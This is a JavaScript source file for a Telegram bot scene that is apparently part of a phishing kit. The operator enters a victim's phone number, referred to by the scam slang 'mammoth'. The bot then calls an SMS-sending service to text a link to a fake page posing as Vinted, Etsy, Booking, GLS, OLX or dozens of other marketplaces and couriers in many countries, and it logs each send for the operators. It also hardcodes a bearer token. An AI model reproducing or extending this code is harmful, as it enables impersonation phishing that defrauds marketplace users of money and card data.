const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");
const axios = require("axios");

// Helper function to prompt for the phone number
async function requestPhoneNumber(ctx) {
  await ctx.reply("Введите номер телефона мамонта", {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("Отменить", "cancel")]]),
  });
  ctx.scene.state.data = {};
}

// Helper function to retrieve ad and service details
async function getAdAndService(ctx) {
  const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
  const service = await Service.findOne({ where: { code: ad.serviceCode } });
  return { ad, service };
}

// Helper function to prepare and send SMS
async function sendSms(ctx, phone, ad, service) {
  const sendCountry = {
    foxpost_hu: "hungary",
    vinted_hu: "hungary",
    gls_hu: "hungary",
    jofogas_hu: "hungary",

    swisspost_ch: "switzerland",

    euroexpress_ba: "bosnia",
    etsy_eu: "all_world",
    ctt_pt: "pt",

    booking_eu: "all_world",

    etsy_de: "germany",
    vinted_de: "germany",
    vinted_it: "italy",
    vinted_es: "spain",
    vinted_pt: "portugal",
    vinted_nl: "nld",
    vinted_hu: "hu",
    vinted_uk: "gbr",
    dpd_hr: "hr",
    depop_au: "au",
    depop_de: "germany",
    adverts_ie: "ie",
    wallapop_es: "spain",
    wallapop_it: "italy",

    fedex_ae: "ae",
    econt_bg: "bg",
    packeta_sk: "sk",
    ctt_pt: "portugal",
    gls_sl: "sl",
    subito_it: "italy",
    trademe_nz: "nz",
    auspost_au: "au",
    gumtree_au: "au",
    leboncoin_fr: "france",
    etsyverif_eu: "all_world",
    marktplaats_nl: "nl",
    postnord_se: "se",
    gls_hu: "hu",
    olx_pt: "portugal",
    gumtree_uk: "gumtree",
    olx_pt: "portugal",
    olx_ro: "romania",
  };

  const sendService = {
    jofogas_hu: "jofogas",

    foxpost_hu: "foxpost",
    gls_hu: "gls",

    euroexpress_ba: "euroexpress",

    ctt_pt: "ctt",

    postnord_se: "postnord",
    dpd_hr: "dpd",

    etsy_eu: "etsy",
    etsy_de: "etsy",
    vinted_de: "vinted",
    vinted_it: "vinted",
    vinted_es: "vinted",
    vinted_pt: "vinted",
    vinted_hu: "vinted",
    vinted_nl: "vinted",
    vinted_uk: "vinted",
    vinted_hu: "vinted",


    depop_au: "depop",
    depop_de: "depop",
    adverts_ie: "adverts",
    wallapop_es: "wallapop",
    wallapop_it: "wallapop",

    fedex_ae: "fedex",
    econt_bg: "econt",
    packeta_sk: "packeta",
    ctt_pt: "ctt",
    gls_sl: "gls",
    subito_it: "subito",
    trademe_nz: "trademe",
    auspost_au: "auspost",
    gumtree_au: "gumtree",
    gumtree_uk: "gumtree",

    leboncoin_fr: "leboncoin",
    etsyverif_eu: "etsy_verify",
    marktplaats_nl: "marketplaats",
    euroexpress_ba: "euroexpress",
    booking_eu: "booking",
    gls_hu: "gls",
    olx_pt: "olx",
    olx_ro: "olx",
    swisspost_ch: "post"

  };

  try {
    await axios.post(
      "https://depa-sms.pro/send/",
      {
        phone,
        country: sendCountry[ad.serviceCode],
        service: sendService[ad.serviceCode],
        short_url: "true",
        url: `https://${service.domain}/d/${ad.id}`,
      },
      {
        headers: {
          accept: "application/json",
          Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzEyMjcwMTc0NyJ9.mKgyCphnFVInOUmc5F9AvFjaTw2Q8UtXmCSgJgORAVk",
          "Content-Type": "application/json",
        },
      }
    );
    if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    await ctx.reply("<b>✅ СМС успешно отправлено на номер телефона</b>", {
      reply_to_message_id: ctx.message.message_id,
      parse_mode: "HTML",
    });

    log(
      ctx,
      `💬 <b>СМС отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📱 <b>Номер:</b> ${phone}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>\n\n<i>DEPA SMS</i>`
    );
  } catch (err) {
    if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    console.error("Ошибка при отправке SMS:", err);
    await ctx.reply(
      `<b>❌ Ошибка при отправке смс для сервиса ${service.title}!</b>\n\nСендер: <b>DEPA SMS</b>\n\nОшибка: <b>${err.message}</b>\n\n<i>Пожалуйста, перешлите это сообщение разработчику для решения данной проблемы.</i>`,
      {
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id,

      }
    );

  }
}

// Define the wizard scene
const scene = new WizardScene(
  "sendAdSms2",
  async (ctx) => {
    try {
      await requestPhoneNumber(ctx);
      return ctx.wizard.next();
    } catch (err) {
      console.error(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.back();

      const phone = ctx.message.text.replace(/\D+/g, "");
      if (phone.length < 1) return ctx.wizard.back();

      ctx.wizard.state.phone = phone;

      const { ad, service } = await getAdAndService(ctx);

      const loadingMsg = await ctx.reply("⏳ СМС отправляется...");

      const miniCtx = {
        from: ctx.from,
        message: ctx.message,
        reply: (...args) => ctx.reply(...args),
        deleteMessage: (...args) => ctx.deleteMessage(...args),
        tempMessageId: loadingMsg.message_id,
      };


      setImmediate(() => {
        sendSms(miniCtx, phone, ad, service).catch((err) =>
          console.error("Ошибка при отправке SMS:", err)
        );
      });

      return ctx.scene.leave();
    } catch (err) {
      if (ctx.tempMessageId) {
        await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
      }
      console.error(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;
